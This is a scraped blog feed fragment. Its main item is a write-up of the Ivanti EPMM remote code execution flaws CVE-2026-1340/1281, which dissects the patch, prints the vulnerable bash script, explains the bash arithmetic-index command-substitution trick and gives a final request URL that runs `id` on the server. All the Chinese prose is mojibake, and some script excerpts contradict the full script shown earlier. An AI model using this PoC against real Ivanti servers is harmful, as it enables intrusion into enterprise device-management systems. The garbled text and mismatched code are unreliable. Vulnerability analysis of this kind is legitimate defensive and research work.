å¦å¤è¿ä¸ªCOMTransmitä¸ä½æºæ¯æ¯æè¿ç¨æä½ä¸²å£æèæä¸²å£æ°æ®ä¸­ç»§ç»è¿ç«¯çåè½ãæé¡ºä¾¿æµè¯äºä¸ä¸è¿ä¸ªè¿ç¨ä¸²å£åè½ãå¨ä½äºè¥¿å®çAçµèä¸æå¼COMTransmitä¸ä½æºï¼éä¸­è¿ç¨ä¸²å£çåè½ä¹åï¼ä¼å¼¹åºä¸ä¸ªIoCHubè¿ç¨ä¸²å£ççªå£ï¼ç¶åç¹å»å¯ç¨è¿ç¨è¿æ¥æå¡ï¼æèªå·±çæ¬å°è¯å«ç å¤å¶åéç»ä½äºæ­¦æ±çBçµèã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193401812-1734453627.png" class="lazyload"><br>
Bçµèè¿ç¨è¿æ¥Açµèä¹åï¼æå¼äºAçµèä¸è¿æ¥ç485ä¸²å£CH-Aééï¼ç¶å100msåéä¸æ¬¡æ°æ®ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193408602-111203534.png" class="lazyload"><br>
Açµèä¸å¯ä»¥æ¾ç¤ºè¿ç¨è¿æ¥çä¿¡æ¯ï¼å¨485æ¨¡åä¸æCH-AåCH-Cç¨åç»çº¿è¿æ¥ä¹åï¼ä½¿ç¨å¦ä¸ä¸ªä¸²å£å·¥å·æå¼CH-Cå¯ä»¥æ¥æ¶å°æ°æ®ï¼è¯´æè¿ç¨æä½æåï¼é£è¿æå³çä»ä¹å¢ï¼æå³çæäºè¿ä¸ªåè½ä¹åï¼ææ¶ååæ¬éè¦åºå·®çä¸äºè°è¯å·¥ä½ï¼ç°å¨è¿ç¨ä¸²å£ç´æ¥æå®ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193415216-1671687510.png" class="lazyload"><br>
æ ¹æ®è¿ä¸ªæåéçæè¿°ï¼CH9114åç½®EEPROMï¼å¯éç½®è¯çVIDãPIDãæå¤§çµæµå¼ãåååäº§åä¿¡æ¯å­ç¬¦ä¸²ç­åæ°ãè¿æ ·çè¯ï¼åé¢å¦æå¤§æ¹éåºè´§ï¼å®å¨å¯ä»¥éè¿åå¥åç½®EEPROMæ¥è®©å®æå¥çµèåæ¾ç¤ºå±äºèªå·±çäº§åè¯å«ç åååä¿¡æ¯ç­ç­ï¼å¨è¯¢è¿è¯çåå®¶ï¼æä¿¡æ¯ä¿®æ¹å·¥å·éå¥ï¼è½¯ç¡¬ä»¶å¨æ¹é¢æ¯æï¼è¿æ¯æºä¸éçã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193422611-2000791153.png" class="lazyload"><br>
è¿ä¸ªäº§åï¼æå·²ç»æå®ä¸ä¼ å°æçæ·å®åºè¿è¡é¢å®ï¼å¤§å®¶å¯ä»¥å¨æ·å®æç´¢âå°é©¬å¥CH9114Fæ¹æ¡USBè½¬åéééåéå¤å£³RS-485é«ééç¦»æ¨¡åé¢å®âæ¾å°æ·å®é¡µé¢åä¸é¢å®ï¼15å¤©åå¯ä»¥åè´§ãé¢å®çä»·æ ¼æå®168åï¼é¢å®ç»æåæ­£å¸¸å®ä»·ç®åæå®348ï¼äº§åæ¸åéé¤äºè¿ä¸ªæ¨¡åæ¬èº«ï¼è¿åå«äºä¸æ ¹ACç¡è¶æ°æ®çº¿ãåä¸ªå¤å°ç«¯å­ãä»¥åä¸ä¸ªéå¥çè½¨éå¡æ£ãå½ç¶ï¼å¨è¿ä¸ªæç« ä¸­ï¼æä¹æå³é®çåçå¾å±ç¤ºç»å¤§å®¶äºï¼PCBè®¾è®¡åå¤å£³éåä¹é½è¯¦ç»çè¯´äºï¼å¤§å®¶æå´è¶£çä¹å¯ä»¥èªå·±å¶ä½ï¼æ¬¢è¿å±åäº¤æµæé«ã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 19:36">2026-02-02 19:35</span>&nbsp;
<a href="https://www.cnblogs.com/xiaomage-UAV">çµå­å¼åå­¦ä¹ </a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566208);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566208', targetLink: 'https://www.cnblogs.com/xiaomage-UAV/p/19566208', title: 'ææå°±è¡ï¼æèªå¶äºä¸ä¸ªé«éUSBè½¬4è·¯éç¦»RS-485çæ¨¡åã' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ ]]></title>
    <link>https://www.cnblogs.com/mhtsec/p/19566043</link>
    <guid>0491d1702c6f689fe356f69d257a261b</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/mhtsec/p/19566043" title="åå¸äº 2026-02-02 18:41">
    <span role="heading" aria-level="2">Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨ï¼</h2>
<p>æä¸­ææ¯åæä»ä¾äº¤æµè®¨è®ºï¼pocä»ä¾åæ³æµè¯ï¼ç¨äºä¼ä¸èªæ¥ï¼åå¿ç¨äºéæ³æµè¯ï¼æªæææµè¯é æåæç±ä½¿ç¨èæ¿æï¼ä¸æ¬å¬ä¼å·ä»¥åæ£è±ç³æ å³ã</p>
<h2 id="ä»ç»">ä»ç»ï¼</h2>
<p>è¿æ¥,Ivantiå¬å¸æ«é²äºIvanti Endpoint Manager Mobile (EPMM)ä¸­å­å¨çä»£ç æ³¨å¥æ¼æ´(<strong>CVE-2026-1281</strong>å<strong>CVE-2026-1340</strong>)ï¼å¹¶ç¡®è®¤<strong>å·²å­å¨å¨éå©ç¨</strong>ãè¯¥æ¼æ´æºäº Apache HTTPd è°ç¨ç Bash èæ¬å¨å¤çæ¶é´æ³æ¯è¾æ¶ï¼æªè½ææè¿æ»¤æ¶æåæ°ï¼å¯¼è´æ»å»èå¯å©ç¨ Bash ç®æ¯æ©å±ç¹æ§æ³¨å¥ç³»ç»å½ä»¤ã</p>
<h2 id="åæ">åæï¼</h2>
<p>é¦åæ¿å°è¡¥ä¸å</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021209948.png" class="lazyload"></p>
<p>RPMçåé£å°±å¥½åäºï¼ç´æ¥æ¥çå®æ§è¡äºä»ä¹å³å¯ï¼ä½¿ç¨å½ä»¤ï¼</p>
<pre><code>rpm -qp --scripts ivanti-security-update-1761642-1.0.0L-5.noarch.rpm
</code></pre>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021210121.png" class="lazyload"></p>
<p>emmmåå®¹æç¹å¤ï¼ä¸è¿æ ¹æ®å·²ç¥æ¡ä»¶ï¼è¯¥æ¼æ´æºäº Apache HTTPd ï¼è¡¥ä¸åéé¢å¾å®¹æçå°å³é®çä¿®æ¹Apache HTTPdéç½®çå½ä»¤ï¼</p>
<pre><code>/bin/sed -i \
  -e 's|RewriteMap mapAppStoreURL prg:/mi/bin/map-appstore-url|RewriteMap mapAppStoreURL "prg:/bin/java -cp /mi/bin AppStoreUrlMapper"|g' \
  -e 's|RewriteMap mapAftStoreURL prg:/mi/bin/map-aft-store-url|RewriteMap mapAftStoreURL "prg:/bin/java -cp /mi/bin AFTUrlMapper"|g' \
  /etc/httpd/conf.d/ssl.conf
</code></pre>
<p>å°±æ¯è¯´æ<code>map-appstore-url</code>å<code>map-aft-store-url</code>ç»æ¢æäºä¸ç¨æ¯å§ï¼okæä»¬å»ççè¿ä¿©èæ¬æ¯ä»ä¹ï¼ç®å½å·²ç»ç»äºå¨mi/binä¸ï¼æä»¬ç´æ¥è¿ç»ç«¯æ¥ä¸ä¸</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021216970.png" class="lazyload"></p>
<p>map-appstore-urlåmap-aft-store-urlæ¯ä¸ªbashèæ¬ï¼catå°±å¯ä»¥ç´æ¥çåå®¹(å¦ä¸ä¸ªèæ¬åå®¹å·®ä¸å¤ªå¤ï¼å°±ä¸å±ç¤ºäº)ã</p>
<pre><code>#!/bin/bash

set -o nounset

declare -x MI_DATE_COMMAND="date +%Y-%m-%d--%H-%M-%S"
declare -x MI_DATE_FORMAT="%Y-%m-%d--%H-%M-%S"

declare -r kScriptName=$(basename $0)
declare -r kScriptDirectory=$(dirname $0)
declare -r kLogFile="/var/log/${kScriptName}.log"
declare -r kSaltFile="/mi/files/appstore-salt.txt"

declare -r kScriptStartTimeSeconds=$(date +%s)
declare -r kValidTimeStampLength=${#kScriptStartTimeSeconds}

declare -r kAftFileStoreDirectory='/mi/files/aftstore'

# error codes that are used in /etc/httpd/conf.d/ssl.conf
declare -r kPathTraversalAttemptedErrorCode="c91bbeec40aff3fd3fe0c08044c1165a"
declare -r kLinkHashMismatchErrorCode="44b2ff3cf69c5112061aad51e0f7d772"
declare -r kTooLateErrorCode="c6a0e7ca11208b4f11d04a7ee8151a46"
declare -r kTooEarlyErrorCode="80862895184bfa4d00b24d4fbb3d942f"
declare -r kKeyIndexOutOfBoundsErrorCode="f74c27fce7d8e2fecd10ab54eda6bd85"
declare -r kURLStructureInvalidErrorCode="b702087a848177d489a6891bd7869495"
declare -r kTimestampLengthInvalidErrorCode="2ecad569fdaa07e2b66ed2595cf7240f"
declare -r kLinkSpoofErrorCode="cbfa488e9b08d4c5d7b3b2084ffb18e7"
declare -r kLinkUsingOddTraversalErrorCode="f489b91db387b684f56c07e7f5e4308b"

gShouldLogToFile="false"
gSaltFileModificationTime="0"
gTestMode="false"
gErrorCode=0
gErrorMessage=""
declare -a gSaltArray=( )
gCurrentSalt=""
gHostname=""
gPath=""
gStartTime=""
gEndTime=""

if (( $# &gt; 0 )) ; then
  gTestMode="true"
fi

#echo "gTestMode=${gTestMode}"

# information
function log() {
  if ${gTestMode} ; then
    echo "`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}"
  else
    # do not log since it kills performance
    echo "$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}" &gt;&gt; ${kLogFile}
  fi
}

function logDebug() {
  if ${gTestMode} ; then
    echo "`$MI_DATE_COMMAND` -- ${kScriptName} -- ${1}: ${@:2}"
  else
    # do not log since it kills performance
    ${gShouldLogToFile} &amp;&amp; echo "$($MI_DATE_COMMAND) -- ${kScriptName} -- ${1}: ${@:2}" &gt;&gt; ${kLogFile}
  fi
}

# errorCode
# information
function logDenial() {
  local theCurrentDate="$(MI_DATE_COMMAND)"
  if ${gTestMode} ; then
    echo "$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}"
  else
    #echo "$theCurrentDate -- ${kScriptName} -- ${1}: denying: errorCode=${2}: ${@:3}" &gt;&gt; "${kLogFile}"
    logger -t "${kScriptName}" -i -p local0.warning "$theCurrentDate -- ${1}: denying: errorCode=${2}: ${@:3}"
  fi
}

log "MAIN" "starting"

function dumpSaltArray() {
  log "${FUNCNAME}" "entered"

  for theSalt in "${gSaltArray[@]}" ; do
    log "${FUNCNAME}" "theSalt=$theSalt"
  done
}

log "MAIN" "after dumpSaltArray declaration"

function readSaltFile() {
  if [[ -f "${kSaltFile}" ]] ; then
    theCurrentSaltModificationTime=$(stat -c %Y "${kSaltFile}")
    logDebug "${FUNCNAME}" "theCurrentSaltModificationTime=${theCurrentSaltModificationTime}"
    theDeltaTime=$(($theCurrentSaltModificationTime - $gSaltFileModificationTime))
    logDebug "${FUNCNAME}" "theDeltaTime=${theDeltaTime}"

    if [[ "${theDeltaTime}" -ne 0 ]] ; then
      log "${FUNCNAME}" "theDeltaTime=${theDeltaTime} not zero; loading salt from kSaltFile=${kSaltFile}"
      gSaltArray=( $(cat ${kSaltFile}))
      gSaltArray[0]=""
      gSaltFileModificationTime=$theCurrentSaltModificationTime
    fi
  else
    log "${FUNCNAME}" "kSaltFile=${kSaltFile} not found"
  fi
}

log "MAIN" "after readSaltFile declaration"

#readSaltFile
#dumpSaltArray
#readSaltFile

function lookupSaltByIndex() {
#echo "$1 ${#gSaltArray[*]}"
  if [ "$1" -lt ${#gSaltArray[*]} ] ; then
    gCurrentSalt=${gSaltArray[$1]}
  else
    gCurrentSalt=""
  fi

  logDebug "${FUNCNAME}" "theKeyIndex=$1; gCurrentSalt=$gCurrentSalt"
}

log "MAIN" "after lookupSaltByIndex declaration"

function verifyURLConsistency () {
  logDebug "${FUNCNAME}" "${1}"
  local ret="" # this is what we eventually echo and it's the name of a file for httpd to send to the client or a pattern that Rewrite is aware of and kill the connection with the right HTTP error code
  #theAppStoreString=${1%%:*}
  #echo "${theAppStoreString}"
  #declare
  theOldIFS="${IFS}"
  local theArgumentArray

  # process what httpd gave us in $1 splitting on the _
  IFS="_" &amp;&amp; theArgumentArray=(${1})

  theAftStoreString=${theArgumentArray[0]}
  theAftStoreAssetGUIDWithExtension=${theArgumentArray[1]}
  gHostname=${theArgumentArray[2]}
  theURLString=${theArgumentArray[3]}
  #echo "${theAftStoreString}"

  # process what mifs really gave us in $1 splitting on the ,
  IFS="," &amp;&amp; theAftStoreKeyValueArray=(${theAftStoreString})

  IFS="${theOldIFS}"

  if (( ${#theArgumentArray[@]} != 4 )) ; then
    ret="${kURLStructureInvalidErrorCode}"
    log "${FUNCNAME}" "${ret}" "expecting 5 segments; actual=${#theArgumentArray[@]}"
  fi

  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
      logDebug "${FUNCNAME}" "theKey=$theKey; theValue=$theValue"

      case ${theKey} in
        kid)
          gKeyIndex="${theValue}"
          ;;
        st)
          gStartTime="${theValue}"
          if (( ${#gStartTime} != "${kValidTimeStampLength}" )) ; then
            ret="${kTimestampLengthInvalidErrorCode}"
          fi
          ;;
        et)
          gEndTime="${theValue}"
          if (( ${#gEndTime} != "${kValidTimeStampLength}" )) ; then
            ret="${kTimestampLengthInvalidErrorCode}"
          fi
          ;;
        h)
          gHashPrefixString="${theValue}"
          ;;
        *)
          ret="${kURLStructureInvalidErrorCode}"
          logDenial "${FUNCNAME}" "${ret}" "unknown presented key=${theKey}; theValue=${theValue}"
          ;;
      esac
    done
  fi

  if [[ -z ${ret} ]] ; then
    lookupSaltByIndex ${gKeyIndex}

    if [[ -n "${gCurrentSalt}" ]] ; then
      logDebug "${FUNCNAME}" "continuing: gCurrentSalt=$gCurrentSalt"
      theCurrentTimeSeconds=$(date +%s)
      logDebug "${FUNCNAME}" "theCurrentTimeSeconds=${theCurrentTimeSeconds}"
      #theCurrentTimeSeconds=1336011206
      #theCurrentTimeSeconds=1336770818
      #gHostname="cot-0000001.mobileiron.com"
      #gHostname="qa42.mobileiron.com"

      if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]] ; then
        logDebug "${FUNCNAME}" "continuing: not too early"

        if [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; then
          logDebug "${FUNCNAME}" "continuing: not too late"

          # calculate the path
          gPath=${theURLString/\/sha256:${theAftStoreString}/}
          theStringToHash="${gCurrentSalt}${gHostname}${gPath}${gStartTime}${gEndTime}"
          theAssetFile="${theAftStoreAssetGUIDWithExtension}"
          # the string to hash must end with the assetfile start end
          logDebug "${FUNCNAME}" "theStringToHash=${theStringToHash}"

          if [[ "${theStringToHash}" = *"${theAssetFile}${gStartTime}${gEndTime}" ]] ; then
            theSHA256Hash=$(echo -n "${theStringToHash}" | sha256sum)
            theSHA256Prefix=${theSHA256Hash:0:64}
            # theSHA256Prefix=${theSHA256Hash}
            logDebug "${FUNCNAME}" "theSHA256Hash=$theSHA256Hash; theSHA256Prefix=$theSHA256Prefix"

shopt -s nocasematch
            if [[ "${theSHA256Prefix}" = "${gHashPrefixString}" ]] ; then
              logDebug "${FUNCNAME}" "hash matched"

              if [[ "${theAssetFile}" = *..* ]] || [[ "${theAssetFile}" = .* ]] || [[ "${theAssetFile}" = /* ]]; then
                ret="${kPathTraversalAttemptedErrorCode}"
                logDenial "${FUNCNAME}" "${ret}" "getting spoofed: ${theAssetFile}"
              else
                ret="${kAftFileStoreDirectory}"/"${theAftStoreAssetGUIDWithExtension}"
              fi
            else
              ret="${kLinkHashMismatchErrorCode}"
              logDenial "${FUNCNAME}" "${ret}" "link hash mismatch: theSHA256Prefix=$theSHA256Prefix; gHashPrefixString=${gHashPrefixString}; ${1}"
            fi
          else
            ret="${kLinkSpoofErrorCode}"
            logDenial "${FUNCNAME}" "${ret}" "link being spoofed: theStringToHash=${theStringToHash}; requiredSuffix=${theAppStoreSubDirectory}/${theAppStoreAssetGUID}${theAppStoreAssetExtension}${gStartTime}${gEndTime}; ${1}"
          fi
shopt -u nocasematch
        else
          ret="${kTooLateErrorCode}"
          logDenial "${FUNCNAME}" "${ret}" "link too late: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}"
        fi
      else
        ret="${kTooEarlyErrorCode}"
        logDenial "${FUNCNAME}" "${ret}" "link too early: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}"
      fi
    else
      ret="${kKeyIndexOutOfBoundsErrorCode}"
      logDenial "${FUNCNAME}" "${ret}" "key index out of bounds: ${1}"
    fi
  else
    ret="${kURLStructureInvalidErrorCode}"
    logDenial "${FUNCNAME}" "${ret}" "URL not structurally correct: ${1}"
  fi
  # tell httpd what file to send (or error message)
  echo "${ret}"
}

if ${gTestMode} ; then
  readSaltFile
  verifyURLConsistency "${1}"
else
  logDebug "MAIN" looping
  readSaltFile

  while read theCurrentLine; do
    readSaltFile
    logDebug "MAIN" "${theCurrentLine}"
    verifyURLConsistency "${theCurrentLine}"
  done
fi


</code></pre>
<p>ä½åå®¹å¤ªå¤äºï¼æä»¬è¿æ¯è¯·AIèå¸å¸®æä»¬ç»ä¸åæä¸ä¸</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021237941.png" class="lazyload"></p>
<p>AIèå¸å¸®æä»¬åæå¹¶å¾å°äºä¸ä¸ªä¼ åè¯·æ±ï¼ç¶åæä»¬è¿å¾å»apacheçéç½®æä»¶ççå¥å£è·¯å¾æ¯ä»ä¹ï¼å¨/etc/httpd/conf.d/ssl.confæä»¶ä¸­æ¾æ¾ç¸å³çåå®¹,ç±äºéç½®æä»¶åå®¹å¤ªå¤äºè¿éå°±ä¸è´´äºï¼æä¹æå¾æ¾ï¼è¿æ¯è®©AIèå¸å¸®æä»¬æ¾æ¾å§ã</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021246450.png" class="lazyload"></p>
<p>deepseekèå¸è¿æ¯å¤ªåè§£äººæäºï¼ç´æ¥ç»äºä¸ä¸ªæ åè¯·æ±ï¼</p>
<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1666663066,et=1666670266,h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2/75dc90fe-6ae7-4377-913b-7248334d39dc.ipa
</code></pre>
<p>ä½è¿äºä¼ åå°bashä¸­ï¼å¹¶æ²¡ææ¾å°ææ¾çç´æ¥å½ä»¤æ§è¡çç¹ï¼è¿æ¶æä»¬éè¦åçè§£ä¸ä¸bashèæ¬ï¼é¦åçbashèæ¬ä¸­çå¼å¤´ï¼</p>
<pre><code>gKeyIndex=""
gStartTime=""
gEndTime=""
gHashPrefixString=""
gPath=""

IFS=',' read -ra theAppStoreKeyValueArray
</code></pre>
<p>èæ¬ä¼ç¨ <code>IFS=','</code> æä¼ å¥çåæ°åå²ææ°ç» <code>theAppStoreKeyValueArray</code>ï¼ä¼ ååæ¯è¿æ ·çæ°ç»ï¼</p>
<pre><code>["kid=1", "st=1444444444", "et=1444444444", "h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"]
</code></pre>
<p>ç¶åå¨ä¸æ¹æè¿æ ·çä¸æ®µå¾ªç¯ï¼</p>
<pre><code>  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
</code></pre>
<p>å®æä¼ åçè¿äºåæ°ååå¼å¾ªç¯èµå¼ç»äºtheKeyåtheValueï¼ç¶ååè¢«èµå¼å°å¨å±åégKeyIndexãgStartTimeãgEndTimeãgHashPrefixStringä¸­ï¼ç»§ç»­è·ä¸å»ï¼ççè¿äºå¼å¨åªéç¨å°ã</p>
<p>keyåæ°èµå¼å°äºåégKeyIndexï¼æç»å¨è¿éåºç¨ï¼</p>
<pre><code>kAppStoreSaltFile="/mi/files/appstore-salt.txt"
gSalt="" 

if [[ -f ${kAppStoreSaltFile} ]]; then
  gSalt=$(sed -n "${gKeyIndex}p" "${kAppStoreSaltFile}")
  if [[ -z ${gSalt} ]]; then
    ret="${kSaltIndexInvalidErrorCode}"
    logDenial "${FUNCNAME}" "${ret}" "kid(${gKeyIndex}) is invalid (no salt found)"
  fi
else
  ret="${kSaltFileMissingErrorCode}"
  logDenial "${FUNCNAME}" "${ret}" "Salt file ${kAppStoreSaltFile} not found"
fi
</code></pre>
<p>å®æ¯ç¨æ¥è¯»å/mi/files/appstore-salt.txtå¯¹åºè¡çï¼è¿ä¸ªæä»¶éé¢çhashå¼è¯»ååºæ¥ç¨æ¥æ ¡éªåç»­åæ°ã</p>
<p>st åæ°æç»èµå¼ç»äºgStartTimeï¼åå«å¨ä¸¤ä¸ªå°æ¹è¢«è°ç¨ï¼</p>
<pre><code>kValidTimeStampLength=10 

case ${theKey} in
  st)
    gStartTime="${theValue}"
    if (( ${#gStartTime} != "${kValidTimeStampLength}" )); then
      ret="${kTimestampLengthInvalidErrorCode}"
    fi
    ;;
</code></pre>
<p>è¿éå¤æ­äºè¿ä¸ªåæ°æ¯å¦é¿åº¦ä¸º10ã</p>
<pre><code>theCurrentTimeSeconds=$(date +%s)

if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then
  logDebug "${FUNCNAME}" "Current time(${theCurrentTimeSeconds}) &gt; start time(${gStartTime})"
  # ... 
else
  ret="${kRequestExpiredErrorCode}"
  logDenial "${FUNCNAME}" "${ret}" "Start time(${gStartTime}) is in the future"
fi
</code></pre>
<p>è¿éç¨æ¥æ¯è¾å½åæ¶é´æ¯å¦æäºè¯·æ±å¼å§æ¶é´ã</p>
<p>et åæ°ï¼gEndTimeï¼ågStartTimeçç¨å¤å·®ä¸å¤ï¼ä¹æ ¡éªäºé¿åº¦åç¨äºéªè¯å½åæ¶é´â¤ç»ææ¶é´ã</p>
<p>h åæ°ï¼gHashPrefixStringï¼æ¯ç¨äºhashæ ¡éªçå¼ã</p>
<p>çä¸å»è¿æ¯æ²¡æç´è§çå½ä»¤æ§è¡çä»£ç ï¼å«æ¥ï¼æä»¬åå¼å¥ä¸ä¸ªç¥è¯ç¹ã</p>
<p>é¦åç»å¤§å®¶çä¸ä¸ªèæ¬ï¼</p>
<pre><code>#!/bin/bash
arr="" 
var="arr[`echo 'hacked' &gt; ./hack_mht`0]"
[[ 1 -gt $var ]] 

if [[ -f ./hack_mht ]]; then
    echo "æ§è¡æåï¼"
else
    echo "æªæ§è¡"
fi
</code></pre>
<p>broä»¬è§å¾è¿ä¸ªèæ¬è½æåæ§è¡å½ä»¤åï¼</p>
<p>ç­æ¡ï¼</p>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021410761.png" class="lazyload"></p>
<p>ä¸ºä»ä¹ä¼è¿æ ·æï¼å ä¸ºå¨bashä¸­ï¼æ°å¼æ¯è¾åè½å¯ä»¥è§£æarray[index]è¿æ ·çæ°å¼ç´¢å¼ï¼indexä¼è¢«ä¼åè§£æä¸ºç®æ°è¡¨è¾¾å¼ï¼æ¯å¦array[1+1]ï¼ä¼åè®¡ç®1+1ï¼èbashåæä¸ä¸ªå½ä»¤æ¿æ¢çä¼åçº§è§åï¼å¦æä½ æarray[1+1]æ¹ä¸º</p>
<pre><code>array[`echo 111`]
</code></pre>
<p>ååæ§è¡è¢«åå¼å·åè£¹çå½ä»¤ï¼ä¸¾ä¾ï¼</p>
<pre><code>current_date=`date`
echo "ä»å¤©æ¯: $current_date"
echo "å½åç®å½: `pwd`"
</code></pre>
<p>æ¾ç¶å¨if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; åif [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; ä¸­é½å­å¨è¿ä¸ªæ¡ä»¶ï¼ä½æä»¬ä¹åè¯´äºï¼gStartTimeågEndTimeé½åäºé¿åº¦æ ¡éªçï¼å¿é¡»ä¸ºåä½ï¼è¿å°±å¾é¸¡èäºï¼é£æä¹æ ·æè½ç»è¿è¿ä¸ªé®é¢å¢ï¼</p>
<p>åå°æå¼å§çå®ä¹åéä¸å¾ªç¯ï¼</p>
<pre><code>  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
</code></pre>
<p>bashä¸­ä½¿ç¨theKeyåtheValueå¾ªç¯èµå¼ï¼ä¼ åçæåä¸ä¸ªå¼ä¸ºhï¼æä»¥theValueæåçå¼æ¯å°±æ¯hçå¼ï¼é£ç°å¨å°±å¾æææäºï¼gStartTimeågEndTimeé½æé¿åº¦éå¶ï¼ä½hçå¼æ²¡æï¼è½ä¸è½è®©hçå¼èµ°å°if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; thenéé¢å»åºç¨æ°å¼ç´¢å¼+å½ä»¤æ¿æ¢å¢ï¼</p>
<p>å¯ä»¥çï¼æ¢ç¶å¨bashä¸­æåétheValue=hä¼ åï¼é£æä»¬å°±ç´æ¥è®©gStartTime=theValueï¼æç»æµç¨ï¼å¯æ§håæ°-&gt;theValue-&gt;gStartTimeï¼ç¶åè¿å¥if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]];åºç¨æ°å¼ç´¢å¼+å½ä»¤æ¿æ¢ï¼ç°å¨æä»¬å·²ç»æäºRCEçå®æ´é¾æ¡ï¼å¼å§æé æç»pocã</p>
<p>kidåæ°ä¸ºæä»¶è¡æ°ï¼éä¾¿ç¨ä¸ª1ï¼ståæ°ä¸ºtheValueï¼æ³¨æåä½é¿åº¦æ ¡éªï¼æä»¥è¿éè¦åå ä¸¤ä¸ªç©ºæ ¼ï¼etåæ°ä¹åä¸æ¯è¾ï¼ä¹å¯ä½ä¸ºtheValueä¼ åï¼stä¸etéä¾¿ä¸ä¸ªå°æ¹è®¾ç½®ä¸ºtheValueé½å¯ä»¥ï¼æåæ¯håæ°ï¼åªéè¦æ»¡è¶³array[index]å³å¯ã</p>
<p>indexé¨åçåå®¹æäºï¼arrayé¨ååä»ä¹å¢ï¼bashå¼å¤´å¼å¯äºset -o nounsetï¼è¿æ¯ä¸¥æ ¼æ¨¡å¼ï¼ä¸¥æ ¼æ¨¡å¼ä¸ï¼Bash éå°æªå®ä¹çåéä¼ç´æ¥ç»æ­¢èæ¬æ§è¡ï¼ç´æ¥ä»bashå¼å¤´å®ä¹çé£äºç©ºåééé¢éä¸ä¸ªï¼æ¯å¦gPathågHostnameé½å¯ä»¥ï¼æé æç»å¼ï¼</p>
<pre><code>gHostname[`id &gt; /mi/bin/mht`]
</code></pre>
<p>æç»pocï¼</p>
<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1111111111,et=theValue%20%20,h=gHostname%5B%60id%20&gt;%20/mi/bin/mht%60%5D/mht.ipa
</code></pre>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021514890.png" class="lazyload"></p>
<p>è¯¥æ¼æ´å¤ç°ç¯å¢å·²å¨æ å¢ä¸­ä¸æ¶ï¼vip.bdziyi.com/ulabï¼æ å¢ï¼è±æåUnbounded Labï¼æ¯ä¸ä¸ºç½ç»å®å¨å­¦ä¹ èæé çç»¼åæ§å®æå¹³å°ï¼æä¾çå®ä¼ä¸çº§æ¼æ´ç¯å¢ï¼è®©æ¨å¨å®å¨çç¯å¢ä¸­æåå®ææè½ï¼æ ¸å¿ç¹è²ï¼ç¬ç«éç¦»ç¯å¢ï¼æ¯ä½ç¨æ·é½æ¥æ<strong>å®å¨ç¬ç«</strong>çé¶åºç¯å¢ï¼å³ä½¿æ¯åºå¤§çåç½é¶åºï¼ç¯å¢ä¹é´ä¹æ¯<strong>é¶å¹²æ°</strong>ï¼ç¡®ä¿æ¨çå­¦ä¹ è¿ç¨ä¸åä»»ä½å½±åã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 18:41">2026-02-02 18:41</span>&nbsp;
<a href="https://www.cnblogs.com/mhtsec">å¬ä¼å·æ£è±ç³fans</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
